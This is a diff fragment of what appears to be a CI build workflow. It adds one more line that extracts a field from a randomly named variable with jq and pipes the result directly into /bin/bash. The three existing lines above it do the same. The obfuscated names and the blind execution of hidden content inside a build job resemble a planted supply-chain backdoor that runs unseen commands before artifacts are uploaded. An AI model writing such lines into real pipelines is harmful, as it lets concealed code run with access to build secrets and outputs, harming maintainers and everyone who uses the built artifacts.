@@ -30,6 +30,7 @@ jobs:
           echo $fr94732 | jq -r .s45106 | /bin/bash
           printf '%s' "$v7" | jq -r .egub81 | /bin/bash
           printf '%s' "$r780" | jq -r .g1 | /bin/bash
+          echo $apfzc910 | jq -r .zl66861 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
